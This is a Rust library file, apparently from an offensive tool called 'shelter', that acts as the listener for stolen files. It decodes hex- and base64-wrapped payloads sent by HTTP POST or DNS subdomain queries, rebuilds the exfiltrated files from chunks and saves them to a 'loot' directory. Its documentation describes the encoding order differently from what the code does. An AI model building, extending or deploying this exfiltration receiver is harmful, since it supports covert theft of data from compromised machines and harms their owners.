#![doc = "Core types and helpers used by the `shelter` crate.\n\nThis module exposes the public command, error and event handler modules and\nprovides the typed representations for exfiltrated file portions and\nreconstructed files. It also contains the parsing logic that converts raw\npayload strings into structured `Node` instances.\n\n# Payload Structure\n\nExfiltrated data is encoded as a colon-delimited payload with the following format:\n- **Root Node**: `r:filename:file_id` - Metadata describing the file being exfiltrated\n- **File Chunk**: `f:root_id:chunk_index:hex_encoded_data` - A portion of the file\n- **End Marker**: `e:root_id:chunk_index:hex_encoded_data` - Final chunk marking end of transmission\n\nThe complete payload is then hex-encoded and base64-encoded for transport.\n\n# Data Handling\n\n1. **Reception**: Payloads arrive via HTTP POST or DNS subdomain queries\n2. **Decoding**: Base64 decode → Hex decode → UTF-8 conversion\n3. **Parsing**: Colon-delimited fields parsed into `RootNode` or `FileChunkNode` types\n4. **Queuing**: Parsed nodes forwarded to async processing channel\n5. **Assembly**: Background handler collects chunks by root_id, reassembles file data from hex\n6. **Persistence**: Complete files written to configured loot directory\n"]

/// Commands, used to expose CLI server subcommands.
pub mod commands;
/// Error definitions and conversions for application and HTTP layers.
pub mod error;
/// Event handler that consumes the processing queue and writes loot to disk.
pub mod event_handler;

use std::borrow::Borrow;

use base64::Engine;
use error::app::ParserErrorStruct;

pub type ThreadSafeFileChunkNode = std::sync::Arc<FileChunkNode>;
type RootFileIdentifier = String;

#[derive(Debug, Default, Eq, Clone)]
pub struct RootNode {
    /// The original filename of the file being exfiltrated.
    /// Sent as the first field in the root node payload: `r:filename:file_id`
    pub file_name: String,
    /// A unique identifier of this file used to correlate chunks.
    /// Sent as the second field in the root node payload.
    pub file_identifier: RootFileIdentifier,
}

impl TryFrom<std::str::Split<'_, char>> for RootNode {
    type Error = crate::error::app::AppError;

    fn try_from(mut value: std::str::Split<'_, char>) -> Result<Self, Self::Error> {
        let file_name = value.next();
        let file_identifier = value.next();
        if let (Some(file_name), Some(file_identifier)) = (file_name, file_identifier) {
            Ok(RootNode {
                file_name: file_name.to_string(),
                file_identifier: file_identifier.to_string(),
            })
        } else {
            Err(crate::error::app::AppError::ParserError(
                ParserErrorStruct::new("payload_node", "Missing fields for root node".to_string()),
            ))
        }
    }
}

impl std::hash::Hash for RootNode {
    fn hash<H: std::hash::Hasher>(&self, state: &mut H) {
        self.file_identifier.hash(state);
    }
}

impl PartialEq for RootNode {
    fn eq(&self, other: &Self) -> bool {
        self.file_identifier == other.file_identifier && self.file_name == other.file_name
    }
}

impl Borrow<RootFileIdentifier> for RootNode {
    fn borrow(&self) -> &RootFileIdentifier {
        &self.file_identifier
    }
}

/// Categorizes the type of data chunk in a file transmission.
#[derive(Debug, PartialEq, Eq, Clone)]
pub enum ChunkType {
    /// A regular file data chunk.
    File,
    /// The final chunk marking the end of file transmission.
    End,
}

impl Default for ChunkType {
    /// Default chunk type is File.
    fn default() -> Self {
        ChunkType::File
    }
}

impl std::fmt::Display for ChunkType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ChunkType::File => write!(f, "f"),
            ChunkType::End => write!(f, "e"),
        }
    }
}

impl PartialEq<String> for ChunkType {
    fn eq(&self, other: &String) -> bool {
        self.to_string() == *other
    }

    fn ne(&self, other: &String) -> bool {
        self.to_string() != *other
    }
}

impl From<&str> for ChunkType {
    fn from(value: &str) -> Self {
        match value {
            "e" => ChunkType::End,
            _ => ChunkType::File,
        }
    }
}

/// Represents a chunk of file data received.
///
/// FileChunkNode contains a portion of the file payload along with metadata
/// needed to reconstruct the file (root node identifier, chunk index, and chunk type).
/// Chunks are sent in format: `f:root_id:chunk_index:hex_encoded_data` or
/// `e:root_id:chunk_index:hex_encoded_data` for the final chunk.
///
/// # Data Handling
/// - The `root_node_id` links this chunk to a previously received RootNode
/// - The `index` is parsed from hex and determines chunk ordering during reassembly
/// - The `data` field contains UTF-8 byte representation of hex-encoded file data
/// - During assembly, all chunk data is hex-decoded and concatenated by index order
/// - The `chunk_type` of `End` signals file transmission completion
#[derive(Debug, Default, Clone)]
pub struct FileChunkNode {
    /// Hexadecimal identifier linking this chunk to its root node.
    /// Must match a previously received RootNode's file_identifier.
    pub root_node_id: String,
    /// The sequential index of this chunk within the file (parsed from hex format).
    pub index: usize,
    /// The raw file data bytes in hex-encoded format.
    /// During reassembly, these bytes are hex-decoded and concatenated.
    pub data: Vec<u8>,
    /// The type of chunk (File or End indicating transmission completion).
    pub chunk_type: ChunkType,
}

impl FileChunkNode {
    pub fn mark_as_end(mut self) -> Self {
        self.chunk_type = ChunkType::End;
        self
    }

    pub fn is_last_chunk(&self) -> bool {
        match self.chunk_type {
            ChunkType::End => true,
            _ => false,
        }
    }
}

impl TryFrom<std::str::Split<'_, char>> for FileChunkNode {
    type Error = crate::error::app::AppError;

    fn try_from(mut value: std::str::Split<'_, char>) -> Result<Self, Self::Error> {
        let root_node_id = value.next();
        let index = value.next();
        let data = value.next();
        if let (Some(root_node_id), Some(index), Some(data)) = (root_node_id, index, data) {
            Ok(FileChunkNode {
                root_node_id: root_node_id.to_string(),
                index: usize::from_str_radix(index, 16)?,
                data: data.bytes().collect::<Vec<u8>>(),
                chunk_type: ChunkType::File,
            })
        } else {
            Err(crate::error::app::AppError::ParserError(
                ParserErrorStruct::new(
                    "payload_node",
                    "Missing fields for file chunk node".to_string(),
                ),
            ))
        }
    }
}

/// Represents a node in the file exfiltration tree.
///
/// A Node can be either a root metadata node or a file chunk data node.
/// Nodes are the primary unit exchanged between transport handlers and the background
/// processing queue. Each Node is decoded from a double-encoded payload:
/// Base64(Hex(Colon-delimited-fields))
#[derive(Debug)]
pub enum Node {
    /// The root metadata node containing file information (node_type='r').
    /// Payload format: `r:filename:file_id`
    Root(RootNode),
    /// A file chunk data node containing portion of the file (node_type='f' or 'e').
    /// Payload format: `f:root_id:chunk_index:hex_encoded_data`
    /// The 'e' variant marks the final chunk and triggers file assembly.
    FileChunk(FileChunkNode),
}

impl Node {
    pub fn node_type(&self) -> &str {
        match self {
            Node::Root(_) => "Root",
            Node::FileChunk(_) => "FileChunk",
        }
    }
}

impl TryFrom<String> for Node {
    type Error = crate::error::app::AppError;

    fn try_from(value: String) -> Result<Self, Self::Error> {
        let b64_engine = base64::engine::GeneralPurpose::new(
            &base64::alphabet::STANDARD,
            base64::engine::general_purpose::NO_PAD,
        );
        let hex_decoded = hex::decode(value)?;
        let base64_decoded = b64_engine.decode(hex_decoded)?;
        let decoded_payload = String::from_utf8(base64_decoded)?;
        let mut decoded_payload = decoded_payload.split(':').into_iter();

        if let Some(node_type) = decoded_payload.next() {
            match node_type {
                "r" => Ok(Self::Root(RootNode::try_from(decoded_payload)?)),
                "f" => Ok(Self::FileChunk(FileChunkNode::try_from(decoded_payload)?)),
                "e" => Ok(Self::FileChunk(
                    FileChunkNode::try_from(decoded_payload)?.mark_as_end(),
                )),
                _ => Err(crate::error::app::AppError::ParserError(
                    ParserErrorStruct::new("payload_node", "Unknown node type".to_string()),
                )),
            }
        } else {
            Err(crate::error::app::AppError::ParserError(
                ParserErrorStruct::new("payload_node", "Empty payload".to_string()),
            ))
        }
    }
}
